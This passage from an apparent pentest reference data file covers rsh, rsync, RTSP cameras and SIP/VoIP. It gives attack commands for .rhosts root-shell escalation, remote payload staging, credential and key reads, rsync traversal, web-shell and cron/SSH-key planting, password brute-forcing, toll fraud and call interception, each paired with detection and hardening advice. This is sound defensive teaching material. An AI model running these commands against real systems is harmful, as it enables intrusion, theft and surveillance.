          "On a host you already have access to, the .rhosts files show exactly which addresses are trusted for which accounts and what they are allowed to run.",
      },
      {
        title: "Check the service registration",
        command: "grep -r 'rshd\\|514/tcp' /etc/xinetd.d /etc/services 2>/dev/null",
        detail:
          "Inetd and xinetd entries show whether the service is enabled per user or as a standalone daemon, and the /etc/services entry confirms the port mapping.",
      },
    ],
    attacks: [
      {
        title: "Passwordless access through a trusted address",
        severity: "critical",
        command: "rsh -l root <target> id",
        detail:
          "When the source address appears in .rhosts, the server runs the command as the requested account with no authentication of any kind. A trusted workstation becomes a path to every account on the host.",
        detection:
          "Any rsh session from a host that is not on the trusted list, and sessions where the account used differs from the account that owns the .rhosts entry.",
        fix: "Remove the rsh daemon and the .rhosts files, replace the workflow with SSH, and if the mechanism must remain, restrict it to dedicated administration addresses.",
      },
      {
        title: "Trust escalation through a writable .rhosts file",
        severity: "critical",
        command: "echo '<attacker-ip> root' >> /home/<user>/.rhosts && rsh -l root <target> id",
        detail:
          "The .rhosts file is a plain text list, so anyone who can write it grants themselves a remote root shell on the next connection. Group-writable home directories are the usual way this becomes reachable.",
        detection:
          "Any change to a .rhosts file, and an rsh login from an address that was not present in the file beforehand.",
        fix: "Set .rhosts to mode 600 and owned by the account it describes, never make home directories group-writable, and remove the file entirely where SSH is available.",
      },
      {
        title: "Intercepting an rlogin session",
        severity: "medium",
        command: "tcpdump -i eth0 -A -s 0 'tcp port 514'",
        detail:
          "rlogin falls back to sending the password in the clear when the address is not trusted, so an on-path attacker reads a real password rather than a hash.",
        detection:
          "Correlated sessions from the same account to two addresses, or a login that is accepted from a network the account should not use.",
        fix: "Replace rlogin with SSH, and require key-based authentication so that no password is ever sent over the wire.",
      },
    ],
    postEx: [
      {
        title: "Establish a remote shell for lateral movement",
        severity: "high",
        command: "rsh -l <user> <target> 'uname -a; id; hostname'",
        detail:
          "One command collects the kernel version, the effective identity and the host name, which is usually enough to decide what to do next on the far side.",
        detection:
          "rsh sessions that run commands other than the standard start-up files, and a new source address for an account that normally logs in over SSH.",
        fix: "Disable rsh entirely, keep SSH as the single remote access path, and alert on connections to TCP 514.",
      },
      {
        title: "Stage and run tooling through rsh",
        severity: "high",
        command: "rsh -l <user> <target> 'scp -t /tmp && echo payload | base64 -d > /tmp/payload.sh && chmod +x /tmp/payload.sh && sh /tmp/payload.sh'",
        detail:
          "A trusted source can copy files in and execute them without a proper transfer session, which makes the remote host an execution point rather than just a shell.",
        detection:
          "Files written to temporary directories on the host followed by execution, which the audit subsystem records as a process started from a temporary path.",
        fix: "Remove rsh, require SSH with key authentication, and use an allowlist of management hosts for administrative access.",
      },
      {
        title: "Read keys and configuration through the trust path",
        severity: "medium",
        command: "rsh -l <user> <target> 'ls -la ~; cat ~/.ssh/authorized_keys 2>/dev/null; cat ~/.netrc 2>/dev/null'",
        detail:
          "The trusted relationship lets the attacker read home directories without ever touching the authentication system, and any private key found there opens the next hop.",
        detection:
          "Unusual reads of dotfiles and key material on a host where the account is not normally used interactively.",
        fix: "Remove the trust mechanism, protect key material with hardware-backed storage where possible, and keep the remote accounts used for automation separate from human accounts.",
      },
    ],
    commands: [
      { command: "rsh -l <user> <target> id", description: "Runs a command on the remote host." },
      { command: "rsh <target> 'command'", description: "Runs a command using the local user name." },
      { command: "rlogin -l <user> <target>", description: "Opens an interactive remote login." },
      { command: "nc -nv <target> 514", description: "Reads the service banner on TCP 514." },
      { command: "nmap -sV -p 514 --script banner <target>", description: "Fingerprints the service." },
      { command: "nmap -sU -p 514 --script syslog <target>", description: "Checks the UDP 514 syslog listener." },
      { command: "cat ~/.rhosts", description: "Shows the local trust list." },
      { command: "find / -name '.rhosts' -type f 2>/dev/null", description: "Finds every trust file on the host." },
      { command: "tcpdump -i eth0 -A -s 0 'tcp port 514'", description: "Captures the cleartext session." },
      { command: "logger -u -n <target> -d 'test message'", description: "Sends a syslog message to the UDP listener." },
    ],
    hardening: [
      {
        title: "Remove the rsh service",
        detail:
          "Disable rshd, rlogind and their xinetd entries on every host. There is no configuration of the service that makes it appropriate for a modern network.",
      },
      {
        title: "Use SSH with key authentication",
        detail:
          "SSH gives encryption, granular authorisation and a complete audit trail. The migration is a configuration change plus a key distribution exercise.",
      },
      {
        title: "Delete the .rhosts files",
        detail:
          "Empty them rather than leaving them in place with a wildcard entry, and confirm that no user account still carries one.",
      },
      {
        title: "Protect the files that remain",
        detail:
          "Where a trust file has to exist, set mode 600, own it with the account it describes and never let a parent directory be group-writable.",
      },
      {
        title: "Separate syslog from rsh on the firewall",
        detail:
          "TCP 514 and UDP 514 are different services on the same number. Block inbound TCP 514 and keep the syslog receiver on its own VLAN.",
      },
      {
        title: "Log the attempts",
        detail:
          "Record connections to TCP 514 and review them alongside the SSH logs so that the same source address is visible in one place.",
      },
    ],
    tools: ["nmap", "netcat", "tcpdump", "metasploit", "hydra"],
  },

  {
    slug: "rsync",
    name: "Rsync",
    port: 873,
    protocol: "tcp",
    risk: "high",
    tags: ["file-sync", "linux", "backup"],
    summary:
      "Rsync in daemon mode serves a module tree over TCP 873, and its authorisation is per-module rather than per-file. A module configured for anonymous read gives away the whole tree, and a module configured for anonymous write lets anyone place files where the owning system will pick them up. The daemon also runs without a chroot by default on some distributions, which means path traversal reaches the rest of the filesystem.",
    connect: [
      {
        label: "Module listing",
        command: "rsync rsync://<target>/",
        detail: "Asking for the root of the daemon lists every module it offers. The names alone describe what the host stores.",
      },
      {
        label: "Module contents",
        command: "rsync rsync://<target>/<module>/",
        detail: "This lists the module root without transferring anything, which is enough to build a picture of the data before you copy it.",
      },
      {
        label: "Raw connection",
        command: "nc -nv <target> 873",
        detail: "The daemon sends its greeting and the protocol version before any negotiation happens.",
      },
    ],
    recon: [
      {
        title: "Daemon fingerprinting",
        command: "nmap -sV -p 873 --script rsync-server-info <target>",
        detail:
          "The script reads the daemon banner and reports the protocol version and the module names. It is the quickest way to get an inventory of the exports.",
      },
      {
        title: "Module enumeration",
        command: "rsync rsync://<target>/",
        detail:
          "The listing is unauthenticated on most daemons. Note the module names: a module called backup, deploy or release is worth a closer look.",
      },
    ],
    enumeration: [
      {
        title: "Recursive listing of a module",
        command: "rsync --list-only -r rsync://<target>/<module>/",
        detail:
          "This walks the tree and prints every file with its size and timestamp without transferring content, which makes it cheap to map a large export.",
      },
      {
        title: "Transfer a module to a local directory",
        command: "rsync -avz rsync://<target>/<module>/ /tmp/loot/",
        detail:
          "A read-only module copies cleanly. Keep the copy offline and review it before running anything from it.",
      },
      {
        title: "Dry run against a writable module",
        command: "rsync -avzn --delete /tmp/payload/ rsync://<target>/<module>/",
        detail:
          "The -n flag shows what would happen without writing anything, and --delete previews the removals, which is the destructive part of an rsync push.",
      },
    ],
    attacks: [
      {
        title: "Anonymous write to a module",
        severity: "critical",
        command: "rsync -avz payload.txt rsync://<target>/<module>/",
        detail:
          "When a module allows write without a password, the attacker can drop files into it. If the module feeds a deployment script, a cron job or a web root, that becomes code execution rather than a data leak.",
        detection:
          "Write operations from a source that has never synced before, and new files appearing in a module directory outside a deployment window.",
        fix: "Set read only = yes on every module that does not need writes, require auth users, and restrict each module to the host that owns it.",
      },
      {
        title: "Information disclosure through the module list",
        severity: "medium",
        command: "rsync rsync://<target>/",
        detail:
          "The module names and the anonymous directory listings describe the host's storage layout, including backup sets and source trees that were never meant to be reachable.",
        detection:
          "Anonymous listing requests from addresses outside the backup network, and repeated enumeration of the same host from different sources.",
        fix: "Require authentication for every module, keep the daemon bound to a management interface and limit listing permissions with the hosts allow rule.",
      },
      {
        title: "Path traversal when the module is not chrooted",
        severity: "high",
        command: "rsync -av rsync://<target>/<module>/../../../../etc/passwd /tmp/traversal.txt",
        detail:
          "With use chroot = no the daemon resolves paths outside the module root. Parent directory components in the module path reach the rest of the filesystem, including configuration and key material.",
        detection:
          "Requests whose module path contains parent directory components, and reads of files outside the module root in the daemon log.",
        fix: "Set use chroot = yes, run the daemon under an unprivileged account, and keep the module roots on a separate partition from the sensitive parts of the host.",
      },
    ],
    postEx: [
      {
        title: "Drop a file into a deployment path",
        severity: "critical",
        command: "rsync -avz payload.php rsync://<target>/<module>/www/",
        detail:
          "A writable module that backs a web root means the attacker chooses the filename and the content, and the next request runs it. This is the shortest path from an rsync port to code execution.",
        detection:
          "New files in the web root with no matching deployment record, and rsync write operations that originate from an unknown host.",
        fix: "Make the web-facing module read-only for everyone but the deployment host, and separate the staging area from the served directory.",
      },
      {
        title: "Exfiltrate an entire module",
        severity: "high",
        command: "rsync -avz --delete rsync://<target>/<module>/ /tmp/exfil/",
        detail:
          "A single command copies the whole export, including anything that was stored there as a convenience. Compressed transfers make large modules practical to take.",
        detection:
          "A large outbound transfer from the backup host, and read volume that is far above the normal sync pattern.",
        fix: "Require authentication on every module, limit the source addresses, and monitor outbound data volume from the storage tier.",
      },
      {
        title: "Place a scheduled task or a key file",
        severity: "high",
        command: "rsync -avz cronjob rsync://<target>/<module>/cron/ && rsync -avz authorized_keys rsync://<target>/<module>/.ssh/",
        detail:
          "Rsync recreates directories that are missing on the destination, so a module that maps to a cron spool or a home directory accepts files without any directory existing first.",
        detection:
          "New cron entries and new authorised_keys files on hosts that also run rsync, and writes to paths outside the expected module structure.",
        fix: "Keep the daemon read-only for remote sources, chroot every module, and treat a writable module as equivalent to shell access on the host.",
      },
    ],
    commands: [
      { command: "rsync rsync://<target>/", description: "Lists the modules the daemon offers." },
      { command: "rsync rsync://<target>/<module>/", description: "Lists the contents of a module root." },
      { command: "rsync --list-only -r rsync://<target>/<module>/", description: "Recursively lists files without transferring them." },
      { command: "rsync -avz rsync://<target>/<module>/ /tmp/loot/", description: "Copies a module to a local directory." },
      { command: "rsync -avz payload rsync://<target>/<module>/", description: "Uploads a file into a module." },
      { command: "rsync -avzn --delete src/ rsync://<target>/<module>/", description: "Dry run showing what an upload would change." },
      { command: "nmap -sV -p 873 --script rsync-server-info <target>", description: "Reads the daemon banner and module names." },
      { command: "nc -nv <target> 873", description: "Reads the protocol greeting." },
      { command: "rsync -e 'ssh -p 22' -avz <user>@<target>:/path /local", description: "The SSH transport, which is the safer way to run rsync." },
      { command: "cat /etc/rsyncd.conf", description: "Shows the daemon configuration on the server." },
    ],
    hardening: [
      {
        title: "Require authentication on every module",
        detail:
          "Set auth users and a secrets file, and never leave a module open to anonymous access even on an internal network.",
      },
      {
        title: "Mark modules read-only",
        detail:
          "read only = yes is the default for good reason. Enable writes only for the specific host that owns the module and only for the paths it needs.",
      },
      {
        title: "Enable the chroot",
        detail:
          "use chroot = yes confines the daemon to the module root and removes the path traversal route entirely.",
      },
      {
        title: "Restrict the source addresses",
        detail:
          "The hosts allow rule limits which addresses may connect to each module, and the firewall should agree with it.",
      },
      {
        title: "Run the daemon unprivileged",
        detail:
          "Give the rsync user no login shell and only the access it needs, so a configuration mistake does not become root.",
      },
      {
        title: "Keep the port off the internet",
        detail:
          "Bind the daemon to a management interface or tunnel it over SSH, since the protocol has no encryption of its own.",
      },
    ],
    tools: ["nmap", "netcat", "metasploit", "hydra", "rsync"],
  },

  {
    slug: "rtsp",
    name: "RTSP",
    port: 554,
    protocol: "tcp",
    risk: "medium",
    tags: ["media", "streaming", "iot"],
    summary:
      "RTSP is the control protocol that negotiates streaming sessions with IP cameras, network video recorders and set-top boxes. Those devices tend to live on flat internal networks, ship with a known administrator password and are rarely updated, so the RTSP port is often the easiest way into a building's video estate. The same devices usually expose a web interface on the same host, and the RTSP credentials are often valid there too.",
    connect: [
      {
        label: "Stream probe",
        command: "ffprobe -v quiet -show_streams rtsp://<target>:554/",
        detail: "ffprobe performs the DESCRIBE exchange and prints the codec, resolution and frame rate without pulling the whole stream.",
      },
      {
        label: "Playback",
        command: "ffplay rtsp://<user>:<password>@<target>:554/stream1",
        detail: "The stream path differs by device, so the endpoint list from the enumeration step is what makes this work.",
      },
      {
        label: "Raw negotiation",
        command: "printf 'OPTIONS rtsp://<target>:554/ RTSP/1.0\\r\\nCSeq: 1\\r\\n\\r\\n' | nc -nv <target> 554",
        detail: "The OPTIONS request asks the device what it supports and is answered with a Public header listing the methods.",
      },
    ],
    recon: [
      {
        title: "Protocol discovery",
        command: "nmap -sV -p 554 --script rtsp-discover <target>",
        detail:
          "The script sends an OPTIONS request and reports the supported methods and the server header, which usually identifies the camera vendor and firmware.",
      },
      {
        title: "Web interface on the same host",
        command: "nmap -p 80,443,554,8000,8080,8899 <target>",
        detail:
          "Cameras commonly run an administration interface alongside RTSP. The port list shows where the device management surface is.",
      },
    ],
    enumeration: [
      {
        title: "Stream inventory",
        command: "ffprobe -v quiet -print_format json -show_streams rtsp://<target>:554/",
        detail:
          "The response lists each media track with its codec and resolution. A second or third stream usually exists for a different quality level.",
      },
      {
        title: "Anonymous access test",
        command: "ffprobe -v quiet -show_entries stream=codec_name rtsp://<target>:554/",
        detail:
          "If this returns a codec name rather than an authorisation error, the device serves video to anyone who asks.",
      },
      {
        title: "Supported methods",
        command: "printf 'OPTIONS rtsp://<target>:554/ RTSP/1.0\\r\\nCSeq: 1\\r\\n\\r\\n' | nc -nv <target> 554",
        detail:
          "The Public header lists the methods such as DESCRIBE, SETUP, PLAY and TEARDOWN, which describes the control surface available.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated stream access",
        severity: "high",
        command: "ffprobe -v quiet -show_streams rtsp://<target>:554/",
        detail:
          "Cameras frequently allow anonymous access to the main stream. The result is a live feed of whatever the device is pointed at, which in most buildings is a corridor or a desk.",
        detection:
          "RTSP sessions from addresses that are not the recording system, and a stream request from a device that is not on the camera list.",
        fix: "Require authentication for every stream, disable anonymous access in the device configuration and keep the cameras on a segment that only the recorder can reach.",
      },
      {
        title: "Default and weak device credentials",
        severity: "high",
        command: "medusa -h <target> -u admin -P /usr/share/wordlists/rockyou.txt -m RTSP",
        detail:
          "Camera vendors ship a fixed administrator password and it rarely changes. The same account usually opens the web interface and the RTSP stream at the same time.",
        detection:
          "Repeated authentication failures on the RTSP and web ports from one source, and successful logins that use a device's default account.",
        fix: "Change every default password, give each device its own credential, and store them in a management system rather than a shared spreadsheet.",
      },
      {
        title: "Credentials exposed on the network",
        severity: "medium",
        command: "tshark -i eth0 -Y 'rtsp.request' -T fields -e ip.src -e ip.dst -e rtsp.url",
        detail:
          "RTSP without a TLS option sends the authentication digest and the stream URL in the clear. A capture on the same segment recovers both the username and the realm used to brute force it.",
        detection:
          "A capture that shows RTSP traffic with an Authorization header from a workstation that should only be running the recorder.",
        fix: "Use RTSP over TLS where the device supports it, put the cameras on a dedicated VLAN and never run the recorder on the same segment as office devices.",
      },
    ],
    postEx: [
      {
        title: "Reach the device administration interface",
        severity: "high",
        command: "curl -s -u <user>:<password> http://<target>/ -o /tmp/camera.html && grep -oiE 'model[^<]{0,40}|firmware[^<]{0,40}|version[^<]{0,40}' /tmp/camera.html | head -20",
        detail:
          "The web interface usually accepts the same credentials and exposes the model, the firmware version and the configuration page. Firmware versions map directly onto published vulnerabilities for that model.",
        detection:
          "A login to the web interface from an address that is not the administration workstation.",
        fix: "Restrict the management interface to a dedicated admin VLAN, require strong per-device credentials and keep the firmware current on a schedule.",
      },
      {
        title: "Record the video feed",
        severity: "medium",
        command: "ffmpeg -i rtsp://<target>:554/stream1 -t 60 -c copy /tmp/capture.mp4",
        detail:
          "Copying the stream without re-encoding keeps the file small and fast. The recording is the evidence, so the point here is what the device can see.",
        detection:
          "Outbound RTSP sessions and sustained data volume from a device that should only be streaming to the recorder.",
        fix: "Restrict RTSP clients with a per-device allowlist, encrypt the traffic where the device allows it, and treat any camera feed as sensitive personal data.",
      },
      {
        title: "Enumerate the device management surface",
        severity: "medium",
        command: "nmap -p 80,443,554,8000,8080,8899,34567 --script http-title,http-headers <target>",
        detail:
          "Camera families expose a consistent set of extra ports for firmware uploads, discovery and media transfer. Mapping them tells you what else is available on the device.",
        detection:
          "A single source scanning many ports on many devices in sequence, which is the pattern of a sweep rather than an operator.",
        fix: "Close the unused management ports, keep the firmware update interface on the admin network only, and segment the cameras away from the general estate.",
      },
    ],
    commands: [
      { command: "nmap -sV -p 554 --script rtsp-discover <target>", description: "Identifies the RTSP service and its supported methods." },
      { command: "ffprobe -v quiet -show_streams rtsp://<target>:554/", description: "Prints the stream properties for a camera." },
      { command: "ffplay rtsp://<target>:554/stream1", description: "Plays the live stream in a window." },
      { command: "ffmpeg -i rtsp://<target>:554/stream1 -t 60 -c copy capture.mp4", description: "Records a minute of the stream without re-encoding." },
      { command: "printf 'OPTIONS rtsp://<target>:554/ RTSP/1.0\\r\\nCSeq: 1\\r\\n\\r\\n' | nc -nv <target> 554", description: "Sends a raw OPTIONS request." },
      { command: "printf 'DESCRIBE rtsp://<target>:554/stream1 RTSP/1.0\\r\\nCSeq: 2\\r\\nAccept: application/sdp\\r\\n\\r\\n' | nc -nv <target> 554", description: "Describes a stream and returns its SDP." },
      { command: "nc -nv <target> 554", description: "Reads the service greeting." },
      { command: "tshark -Y 'rtsp.request' -T fields -e rtsp.url", description: "Extracts the requested stream paths from a capture." },
      { command: "nmap -p 80,443,554,8000,8080,8899 <target>", description: "Maps the other services on the device." },
      { command: "curl -s -u <user>:<password> http://<target>/", description: "Opens the device administration interface." },
    ],
    hardening: [
      {
        title: "Change every default credential",
        detail:
          "Admin and root passwords that ship with a camera model are public knowledge. Set a unique password on each device and record it in a management system.",
      },
      {
        title: "Disable anonymous stream access",
        detail:
          "Most devices have an option to allow unauthenticated playback. Turn it off, and require a credential for every stream path.",
      },
      {
        title: "Segment the camera network",
        detail:
          "Put the devices on their own VLAN with no route to the general corporate network, so a compromised camera is a contained problem.",
      },
      {
        title: "Keep the firmware current",
        detail:
          "Camera firmware fixes both remote code execution bugs and default credential handling. Test the update on a single device before rolling it out.",
      },
      {
        title: "Remove the port forwarding",
        detail:
          "Never expose RTSP or the management interface to the internet. Remote viewing belongs behind a VPN with an identity provider in front of it.",
      },
      {
        title: "Turn off UPnP and discovery",
        detail:
          "Automatic discovery and UPnP let any host on the segment configure a camera, so both should be disabled on devices that support it.",
      },
    ],
    tools: ["nmap", "netcat", "hydra", "medusa", "tshark", "nuclei"],
  },

  {
    slug: "sip-voip",
    name: "SIP / VoIP",
    port: 5060,
    protocol: "udp",
    risk: "high",
    tags: ["voip", "telephony", "signaling"],
    summary:
      "SIP is the signalling protocol that sets up and tears down voice calls, and it usually runs on UDP 5060 in the clear. Endpoints authenticate with a digest based on a shared PIN, and those PINs are rarely as strong as a domain password. A successful registration gives the attacker a phone line on the network, and the media that follows travels over separate RTP ports that anyone on the segment can capture.",
    connect: [
      {
        label: "Probe the service",
        command: "sipsak -u 1000 -c 'OPTIONS sip:<target> SIP/2.0' <target>",
        detail: "sipsak sends a crafted request and prints the response, which confirms the software and the extensions in use.",
      },
      {
        label: "Attempt a registration",
        command: "sipsak -u 1000 -c 'REGISTER sip:<target> SIP/2.0' <target>",
        detail: "The response shows whether the endpoint requires a digest and what nonce it hands back.",
      },
      {
        label: "Capture the signalling",
        command: "sngrep -I <target> 5060 -O /tmp/sip.pcap",
        detail: "sngrep decodes the dialog and writes a capture file, which makes the calls far easier to read than the raw packets.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sU -sT -p 5060,5061,5062 -sV <target>",
        detail:
          "SIP runs over UDP and TCP, and port 5061 carries it inside TLS. Checking all three tells you which transports are actually enabled.",
      },
      {
        title: "Method and software discovery",
        command: "printf 'OPTIONS sip:<target> SIP/2.0\\r\\nCSeq: 1\\r\\nTo: <sip:<target>>\\r\\nFrom: <sip:test@<target>>\\r\\nCall-ID: 1\\r\\nContent-Length: 0\\r\\n\\r\\n' | nc -nv <target> 5060",
        detail:
          "The Allow header lists the supported methods and the Server header identifies the softswitch or handset software and its version.",
      },
    ],
    enumeration: [
      {
        title: "Extension enumeration",
        command: "for i in $(seq 1000 1200); do sipsak -u $i -c 'OPTIONS sip:<target> SIP/2.0' <target> | grep -q '200 OK' && echo \"extension $i\"; done",
        detail:
          "Endpoints answer a request for their own extension and refuse the ones that do not exist, so the difference in the status code enumerates the directory.",
      },
      {
        title: "Registration capture",
        command: "sngrep -I <target> 5060 -O /tmp/sip.pcap && sngrep -I /tmp/sip.pcap -I <target>",
        detail:
          "A REGISTER message carries the extension, the transport and the response code. Failed codes tell you which credentials were rejected.",
      },
      {
        title: "Header view of a live exchange",
        command: "tshark -i eth0 -Y 'sip.Method == \"REGISTER\" || sip.Method == \"INVITE\"' -T fields -e sip.from.user -e sip.to.user -e sip.Status-Code",
        detail:
          "This extracts the parties and the outcome from each request, which is enough to build a picture of who talks to whom.",
      },
    ],
    attacks: [
      {
        title: "Guessing endpoint PINs",
        severity: "high",
        command: "hydra -l 1000 -P /usr/share/wordlists/rockyou.txt -s 5060 udp://<target> sip",
        detail:
          "The digest authentication needs a response to the challenge, which makes the attack slower than for a plain form, but the PIN space is small and the endpoint PINs are often four digits.",
        detection:
          "A burst of REGISTER requests for the same extension from one source, and a successful registration that is followed by no call activity.",
        fix: "Use long random PINs per endpoint, rate limit REGISTER attempts at the softswitch and replace the shared secret scheme with per-user credentials.",
      },
      {
        title: "Registering an unauthorised endpoint",
        severity: "high",
        command: "sipsak -u 1000 -c 'REGISTER sip:<target> SIP/2.0' -H 'Contact: <sip:1000@<attacker-ip>>' <target>",
        detail:
          "Once a registration succeeds the endpoint is treated as a phone on the network. The attacker can then place calls, which is where toll fraud and premium-rate abuse begin.",
        detection:
          "A registration whose contact address sits on a different subnet to the phone's configured location, and a sudden increase in outbound calls from one extension.",
        fix: "Bind registrations to a known source address, require a per-extension PIN, and alert on registrations from outside the expected network.",
      },
      {
        title: "Interception of cleartext signalling",
        severity: "medium",
        command: "tshark -i eth0 -Y 'sip' -T fields -e sip.from.user -e sip.to.user -e sip.CSeq",
        detail:
          "A digest header reveals the realm and the username, and an OPTIONS response from a handset often carries the model and firmware version. That is exactly what you need to narrow down the attack surface.",
        detection:
          "A host on the voice segment that generates SIP traffic it has no business sending.",
        fix: "Use SIPS on 5061 with a trusted certificate, keep the voice segment isolated and never place handsets on a shared user network.",
      },
    ],
    postEx: [
      {
        title: "Capture and play back the call audio",
        severity: "high",
        command: "tshark -i eth0 -f 'udp portrange 10000-20000' -w rtp.pcap && ffmpeg -i rtp.pcap -c:a pcm_mulaw call.wav",
        detail:
          "RTP carries the audio on separate ports that are usually not protected by anything. A capture on the segment recovers the conversation, and ffmpeg converts it into a playable file.",
        detection:
          "A host that is receiving a large volume of RTP without an associated SIP dialog, which is the classic signature of a tap.",
        fix: "Encrypt the media with SRTP where the phones support it, keep RTP on a dedicated segment and make the softswitch enforce media encryption.",
      },
      {
        title: "Place calls for toll fraud",
        severity: "high",
        command: "sipsak -u 1000 -c 'INVITE sip:<target> SIP/2.0' -H 'Contact: <sip:1000@<attacker-ip>>' <target>",
        detail:
          "A registered extension can be used to place calls, and outbound dialling rules are often misconfigured to permit premium or international destinations. The cost lands on the organisation that owns the trunk.",
        detection:
          "Outbound calls to international or premium-rate prefixes that do not match the business hours or the expected call patterns.",
        fix: "Apply strict dialling permissions per extension, block premium-rate destinations at the trunk, and require a PIN for outbound calls.",
      },
      {
        title: "Harvest the call detail records",
        severity: "medium",
        command: "sngrep -I <target> 5060 -O /tmp/sip.pcap && grep -aE 'Call-ID|from|to' /tmp/sip.pcap | head -40",
        detail:
          "The signalling shows who called whom and when. On an internal deployment that is a map of the organisation and of the conversations it needs to keep confidential.",
        detection:
          "Captured traffic from a host with no telephony role, and any attempt to reach the call detail record store directly.",
        fix: "Restrict access to the call detail records, retain them only as long as the business requires, and treat the signalling as sensitive wherever it is captured.",
      },
    ],
    commands: [
      { command: "nmap -sU -sT -p 5060,5061,5062 -sV <target>", description: "Detects SIP over UDP and TCP and the TLS port." },
      { command: "sipsak -u 1000 -c 'OPTIONS sip:<target> SIP/2.0' <target>", description: "Sends an OPTIONS request and prints the response." },
      { command: "sipsak -u 1000 -c 'REGISTER sip:<target> SIP/2.0' <target>", description: "Starts a registration and shows the challenge." },
      { command: "printf 'OPTIONS sip:<target> SIP/2.0\\r\\nCSeq: 1\\r\\n\\r\\n' | nc -nv <target> 5060", description: "Raw OPTIONS request." },
      { command: "nc -nv <target> 5060", description: "Reads the raw SIP responses." },
      { command: "sngrep -I <target> 5060 -O /tmp/sip.pcap", description: "Captures and decodes the SIP dialog." },
      { command: "sipdump <target> 5060", description: "Dumps SIP messages from a host to stdout." },
      { command: "hydra -l 1000 -P /usr/share/wordlists/rockyou.txt -s 5060 udp://<target> sip", description: "Brute forces an extension PIN." },
      { command: "tshark -i eth0 -Y 'sip' -T fields -e sip.from.user -e sip.to.user -e sip.Status-Code", description: "Extracts the parties and results from SIP traffic." },
      { command: "tshark -i eth0 -f 'udp portrange 10000-20000' -w rtp.pcap", description: "Captures the RTP media streams." },
    ],
    hardening: [
      {
        title: "Use long unique PINs per endpoint",
        detail:
          "Four-digit extensions with shared PINs are the default. Generate a random PIN for each device and change it whenever a device leaves the estate.",
      },
      {
        title: "Move to SIPS on 5061",
        detail:
          "SIP over TLS protects the signalling, including the digest exchange and the call metadata. Close 5060 to anything that does not need it.",
      },
      {
        title: "Rate limit registration attempts",
        detail:
          "The softswitch should throttle REGISTER messages per source and per extension, so a PIN guess runs at a rate that is not useful.",
      },
      {
        title: "Apply dialling permissions",
        detail:
          "Restrict each extension to the destinations it needs and block international and premium-rate prefixes at the trunk provider.",
      },
      {
        title: "Enable media encryption",
        detail:
          "SRTP protects the audio itself, which is what actually carries the conversation, and it should be enforced rather than optional.",
      },
      {
        title: "Separate the voice network",
        detail:
          "Put the handsets, the softswitch and the RTP traffic on their own segment with strict rules between them and the user network.",
      },
    ],
    tools: ["nmap", "netcat", "hydra", "tshark", "sngrep", "sipsak"],
  },
];
